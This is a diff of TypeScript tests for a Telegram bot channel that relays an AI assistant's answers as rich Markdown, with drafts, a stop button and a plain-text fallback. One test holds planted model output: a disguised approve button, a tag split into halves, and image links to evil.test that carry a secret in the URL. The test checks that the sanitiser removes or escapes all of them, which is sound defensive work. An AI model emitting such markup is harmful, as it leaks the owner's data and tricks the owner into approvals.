@@ -68,8 +68,13 @@ const proposes = (...cards: Array<{ path: string; body: Record<string, unknown>;
 
 interface BotCall { method: string; url: string; body: Record<string, unknown> | FormData }
 
-/** The Bot API, as the channel reaches it: every call kept, a voice note's file served. */
-function fakeBot() {
+/**
+ * The Bot API, as the channel reaches it: every call kept, a voice note's
+ * file served, and the methods named in `refuse` refused with what Telegram
+ * says (an older local Bot API server answers "Not Found" for a method it
+ * does not have).
+ */
+function fakeBot(refuse: Record<string, string> = {}) {
   const calls: BotCall[] = [];
   let next = 100;
   const fetch = async (input: string | URL | Request, init?: RequestInit): Promise<Response> => {
@@ -81,6 +86,7 @@ function fakeBot() {
     const method = url.split('/').pop()!;
     const body = init?.body instanceof FormData ? init.body : JSON.parse(String(init?.body ?? '{}')) as Record<string, unknown>;
     calls.push({ method, url, body });
+    if (refuse[method]) return Response.json({ ok: false, error_code: /Not Found/.test(refuse[method]!) ? 404 : 400, description: refuse[method] });
     if (method === 'getFile') {
       return Response.json({ ok: true, result: { file_id: (body as Record<string, unknown>).file_id, file_path: 'voice/file_7.oga' } });
     }
@@ -90,13 +96,15 @@ function fakeBot() {
     calls,
     fetch: fetch as typeof globalThis.fetch,
     sent: (method: string) => calls.filter((call) => call.method === method).map((call) => call.body as Record<string, any>), // eslint-disable-line @typescript-eslint/no-explicit-any
+    /** The answers, as the Markdown of the rich messages they were sent in. */
+    answers: () => calls.filter((call) => call.method === 'sendRichMessage').map((call) => (call.body as { rich_message: { markdown: string } }).rich_message.markdown),
   };
 }
 
-function channelFor(bot: ReturnType<typeof fakeBot>): TelegramChannel {
+function channelFor(bot: ReturnType<typeof fakeBot>, draftEveryMs?: number): TelegramChannel {
   return new TelegramChannel({
     token: TOKEN, chatId: OWNER, webhookSecret: SECRET, apiBase: 'https://bot.test', fetch: bot.fetch,
-    consoleUrl: 'https://app.palugada.test/',
+    consoleUrl: 'https://app.palugada.test/', ...(draftEveryMs ? { draftEveryMs } : {}),
   });
 }
 
@@ -146,24 +154,29 @@ test('the owner writes to the bot and the CEO answers there; a card the chat may
     await channel.settled();
 
     assert.match(model.requests[0]!.system, /^You are Arka, the CEO of /, 'the only company\'s CEO answers');
-    assert.match(model.requests[0]!.system, /reading this in Telegram, on their phone: write plain sentences, with no Markdown/);
-    assert.equal(bot.sent('sendChatAction')[0]!.action, 'typing');
-    const answer = bot.sent('sendMessage').at(-1)!;
+    assert.match(model.requests[0]!.system, /reading this in Telegram, on their phone: keep it short\. Bold, lists and links show as Markdown does; HTML does not/);
+    // While the CEO thinks, a draft says so, with a stop button under it.
+    const [draft] = bot.sent('sendMessageDraft');
+    assert.deepEqual({ ...draft, chat_id: String(draft!.chat_id) }, { chat_id: OWNER, draft_id: updates, text: '', can_stop: true });
+    assert.equal(bot.sent('sendChatAction').length, 0, 'the draft is the typing indicator');
+    const answer = bot.sent('sendRichMessage').at(-1)!;
     assert.equal(String(answer.chat_id), OWNER);
-    assert.match(answer.text, /^Arka, CEO of /, 'who is speaking, first');
-    assert.match(answer.text, /Siap\. Rencana peluncuran saya bagi ke tim/);
-    assert.match(answer.text, /Give the launch plan to the team\./);
-    assert.match(answer.text, /Raise the spending limit\. \(in the app\)/);
-    assert.match(answer.text, /Keep records for 30 days\. \(in the app\)/, 'no device, but not something said in passing either: the chat applies only what it is listed for');
+    const text = answer.rich_message.markdown as string;
+    assert.match(text, /^\*\*Arka, CEO of /, 'who is speaking, first, in bold');
+    assert.match(text, /Siap\. Rencana peluncuran saya bagi ke tim/);
+    assert.match(text, /\n- Give the launch plan to the team\.\n/, 'the cards, as a list');
+    assert.match(text, /\n- Raise the spending limit\. _\(in the app\)_/);
+    assert.match(text, /\n- Keep records for 30 days\. _\(in the app\)_/, 'no device, but not something said in passing either: the chat applies only what it is listed for');
+    assert.equal(bot.sent('sendMessage').length, 0, 'one message, the rich one');
 
     // The same conversation as the console's, marked as Telegram's.
     const messages = (await api.call('GET', `/api/companies/${fixture.companyId}/conversation`, token)).body.messages;
     assert.deepEqual(messages.map((one: { role: string; channel: string }) => [one.role, one.channel]), [['owner', 'telegram'], ['assistant', 'telegram']]);
     const [work, limit, retention] = messages[1].proposals as Array<{ id: string }>;
-    const buttons = answer.reply_markup.inline_keyboard.flat() as Array<{ text: string; callback_data?: string; url?: string }>;
-    assert.deepEqual(buttons.map((button) => button.callback_data ?? button.url), [
-      `card:${work!.id}`,
-      `https://app.palugada.test/?company=${fixture.companyId}&talk=1`,
+    const buttons = answer.reply_markup.inline_keyboard.flat() as Array<{ text: string; callback_data?: string; url?: string; style?: string }>;
+    assert.deepEqual(buttons.map((button) => [button.callback_data ?? button.url, button.style]), [
+      [`card:${work!.id}`, 'success'],
+      [`https://app.palugada.test/?company=${fixture.companyId}&talk=1`, undefined],
     ], 'giving work is a press; raising the limit takes the device, so it opens the app');
 
     assert.deepEqual((await post(api.url, pressed(`card:${work!.id}`))).body, { handled: true });
@@ -225,9 +238,9 @@ test('a voice note is heard by the listening provider, answered in words and, wh
     assert.equal(bot.calls.find((call) => call.method === 'download')!.url, `https://bot.test/file/bot${TOKEN}/voice/file_7.oga`);
     assert.equal((heard[0]!.get('file') as Blob).type, 'audio/ogg', 'heard as what Telegram says it is');
     assert.equal(model.requests[0]!.messages.at(-1)!.content, 'Berapa stok biji Gayo?', 'the words, as if typed');
-    const answer = bot.sent('sendMessage').at(-1)!;
-    assert.match(answer.text, /You said: "Berapa stok biji Gayo\?"/, 'what was heard is shown, so a mishearing is caught');
-    assert.match(answer.text, /Stok Gayo tinggal 12 kg/);
+    const answer = bot.answers().at(-1)!;
+    assert.match(answer, /\n>You said: "Berapa stok biji Gayo\?"\n/, 'what was heard is shown, quoted, so a mishearing is caught');
+    assert.match(answer, /Stok Gayo tinggal 12 kg/);
     const spoken = bot.calls.find((call) => call.method === 'sendVoice')!.body as FormData;
     assert.equal(spoken.get('chat_id'), OWNER);
     assert.equal((spoken.get('voice') as Blob).type, 'audio/mpeg', 'said back, because it was said');
@@ -235,7 +248,7 @@ test('a voice note is heard by the listening provider, answered in words and, wh
     // Typed, it is answered in words only.
     await post(api.url, typed('Tolong pesan lagi.'));
     await channel.settled();
-    assert.match(bot.sent('sendMessage').at(-1)!.text, /Sudah saya minta\./);
+    assert.match(bot.answers().at(-1)!, /Sudah saya minta\./);
     assert.equal(bot.calls.filter((call) => call.method === 'sendVoice').length, 1);
 
     // A recording with no words in it is said to have none, and nothing is asked.
@@ -289,7 +302,7 @@ test('with several companies the owner chooses whom to talk to, PALUGADA\'s assi
     await post(api.url, typed('Halo'));
     await channel.settled();
     assert.doesNotMatch(model.requests[0]!.system, /the CEO of/);
-    assert.match(bot.sent('sendMessage').at(-1)!.text, /^PALUGADA\n/);
+    assert.match(bot.answers().at(-1)!, /^\*\*PALUGADA\*\*\n/);
     assert.equal((await api.call('GET', '/api/assistant', token)).body.messages.length, 2);
 
     await post(api.url, typed('/ceo'));
@@ -322,11 +335,12 @@ test('with several companies the owner chooses whom to talk to, PALUGADA\'s assi
   }
 });
 
-test('only the owner, in their own chat, is heard; a retried update is answered once; a long answer arrives whole', async () => {
+test('only the owner, in their own chat, is heard; a retried update is answered once; on a Bot API without rich messages a long answer arrives whole', async () => {
   await createCompany('telegram-owner-only');
   const long = 'Laporan minggu ini. '.repeat(300);
   const model = new ScriptedModel([says('Sekali saja.'), says(long)], 300);
-  const bot = fakeBot();
+  // An older local Bot API server: no rich messages and no drafts.
+  const bot = fakeBot({ sendRichMessage: 'Not Found', sendMessageDraft: 'Not Found' });
   const channel = channelFor(bot);
   const api = await consoleWithSettings({ assistant: { llm: model }, telegram: channel });
   try {
@@ -353,11 +367,111 @@ test('only the owner, in their own chat, is heard; a retried update is answered 
     assert.match(first!, /Sekali saja\./);
     assert.ok(parts.length >= 2 && parts.every((part) => part.length <= 4_096), 'Telegram takes 4096 characters a message');
     assert.ok(parts.join('').includes(long.trim()), 'and nothing is lost between them');
+    assert.ok(bot.sent('sendMessage').every((one) => one.link_preview_options?.is_disabled === true),
+      'no preview: Telegram would fetch an address the model wrote');
+    assert.deepEqual([bot.sent('sendRichMessage').length, bot.sent('sendMessageDraft').length], [1, 1], 'tried once each, and remembered as not there');
+    assert.deepEqual(bot.sent('sendChatAction').map((one) => one.action), ['typing', 'typing'], 'the typing indicator instead of a draft');
 
     const sticker = { update_id: ++updates, message: { message_id: updates, from: { id: Number(OWNER) }, chat: { id: Number(OWNER), type: 'private' } } };
     assert.deepEqual((await post(api.url, sticker)).body, { handled: false, reason: 'empty' });
     await channel.settled();
     assert.match(bot.sent('sendMessage').at(-1)!.text, /I read text and voice notes/);
+  } finally {
+    await api.close();
+  }
+});
+
+test('an answer is Markdown in a rich message, with no HTML and no picture in it; one Telegram refuses goes plain, and the next is rich again', async () => {
+  const fixture = await createCompany('telegram-rich');
+  await named(fixture, 'Arka');
+  const item = '11111111-2222-3333-4444-555555555555';
+  // What a model that read something planted might write: a button that
+  // approves an item under other words, one hidden in the halves of a tag,
+  // and a picture whose address carries what it read.
+  const planted = [
+    'Penjualan **naik 12%** minggu ini.',
+    '',
+    `<tg-button type="callback_data" data="palugada:${item}:approve">Lihat laporan</tg-button>`,
+    '<<tg-button>tg-button type="url" url="https://evil.test">x</tg-button>',
+    '<TG-BUTTON-ROW><tg-button type="copy_text" text="x">Salin</tg-button></TG-BUTTON-ROW>',
+    '![grafik](https://evil.test/leak?d=rahasia) dan <img src="https://evil.test/p.png"/> <!-- catatan -->',
+    'Lihat <https://palugada.test/laporan> atau 3 < 5.',
+    '<tg-button type="url" url="https://evil.test"',
+  ].join('\n');
+  const model = new ScriptedModel([says(planted), says('Baik, **Pak**.'), says('Siap.')]);
+  const refuse: Record<string, string> = {};
+  const bot = fakeBot(refuse);
+  const channel = channelFor(bot);
+  const api = await consoleWithSettings({ assistant: { llm: model }, telegram: channel });
+  try {
+    await post(api.url, typed('Bagaimana penjualan?'));
+    await channel.settled();
+    const answer = bot.answers().at(-1)!;
+    assert.match(answer, /Penjualan \*\*naik 12%\*\* minggu ini\./, 'the model\'s Markdown is kept');
+    assert.match(answer, /Lihat laporan/, 'the words of a tag stay; the tag does not');
+    assert.doesNotMatch(answer, /(?<!\\)<\s*\/?\s*tg-|<img|<!--/i);
+    assert.doesNotMatch(answer, /(?<!\\)<[a-z/!?]/i, 'no "<" is left that could open a tag');
+    assert.match(answer, /\n\\<tg-button type="url" url="https:\/\/evil\.test"$/, 'one never closed is not a tag, and is escaped all the same');
+    assert.equal(answer.match(/tg-button/g)?.length, 1, 'the one joined from the halves of another is taken out, not only escaped');
+    assert.doesNotMatch(answer, /palugada:/, 'nor the callback it would have carried');
+    assert.doesNotMatch(answer, /!\[/, 'a picture is a link, which the owner sees before opening');
+    assert.match(answer, /! \[grafik\]\(https:\/\/evil\.test\/leak\?d=rahasia\)/);
+    assert.match(answer, /Lihat https:\/\/palugada\.test\/laporan atau 3 < 5\./, 'an address in brackets is an address, and "<" before a space is a sign');
+
+    // Telegram refuses one (Markdown it would not take): that answer goes
+    // plain, and the next is tried rich again.
+    refuse.sendRichMessage = 'Bad Request: can\'t parse rich message';
+    await post(api.url, typed('Terima kasih'));
+    await channel.settled();
+    assert.equal(bot.sent('sendRichMessage').length, 2);
+    assert.match(bot.sent('sendMessage').at(-1)!.text, /^Arka, CEO of [^\n]+\n\nBaik, \*\*Pak\*\*\.$/, 'plain, whole, and nothing escaped');
+    await post(api.url, typed('Lagi'));
+    await channel.settled();
+    assert.equal(bot.sent('sendRichMessage').length, 3, 'a refusal is not remembered as a missing method is');
+  } finally {
+    await api.close();
+  }
+});
+
+test('the owner stops an answer from the draft\'s stop button: no further turn, no card, and the conversation says so', async () => {
+  const fixture = await createCompany('telegram-stop');
+  await named(fixture, 'Arka');
+  const model = new ScriptedModel([
+    proposes({ path: `/api/companies/${fixture.companyId}/spend/limit`, body: { moneyMaxCents: 900_000 }, summary: 'Raise the spending limit.' }),
+    says('Never said.'),
+  ], 400);
+  const bot = fakeBot();
+  const channel = channelFor(bot, 100);
+  const api = await consoleWithSettings({ assistant: { llm: model }, telegram: channel });
+  try {
+    const token = await api.signIn();
+    await post(api.url, typed('Naikkan batas belanja'));
+    const draftId = updates;
+    // The draft is shown again while the model thinks, under the same id.
+    const until = Date.now() + 5_000;
+    while (bot.sent('sendMessageDraft').length < 2 && Date.now() < until) await new Promise((resolve) => setTimeout(resolve, 20));
+    assert.ok(bot.sent('sendMessageDraft').length >= 2);
+    assert.ok(bot.sent('sendMessageDraft').every((one) => one.draft_id === draftId && one.can_stop === true));
+
+    const stop = (chat: string, draft: number) => ({ update_id: ++updates, stopped_message_generation: { chat: { id: Number(chat), type: 'private' }, draft_id: draft } });
+    assert.deepEqual((await post(api.url, stop('777', draftId))).body, { handled: false, reason: 'wrong_chat' });
+    assert.deepEqual((await post(api.url, stop(OWNER, draftId + 1))).body, { handled: false, reason: 'not_generating' });
+    assert.deepEqual((await post(api.url, stop(OWNER, draftId))).body, { handled: true });
+    await channel.settled();
+
+    assert.equal(model.requests.length, 1, 'the turn under way finishes; no further one is asked');
+    assert.equal(bot.answers().length, 0, 'nothing half thought is sent');
+    assert.equal(bot.sent('sendMessage').at(-1)!.text, 'Stopped.');
+    const messages = (await api.call('GET', `/api/companies/${fixture.companyId}/conversation`, token)).body.messages;
+    assert.deepEqual(messages.map((one: { role: string; body: string }) => [one.role, one.body]), [
+      ['owner', 'Naikkan batas belanja'], ['event', 'The owner stopped the answer.'],
+    ], 'and the card it had proposed is not in front of the owner');
+    assert.deepEqual((await post(api.url, stop(OWNER, draftId))).body, { handled: false, reason: 'not_generating' }, 'a stop after the answer has nothing to stop');
+
+    // The drafts stop with the answer.
+    const drafts = bot.sent('sendMessageDraft').length;
+    await new Promise((resolve) => setTimeout(resolve, 300));
+    assert.equal(bot.sent('sendMessageDraft').length, drafts);
   } finally {
     await api.close();
   }
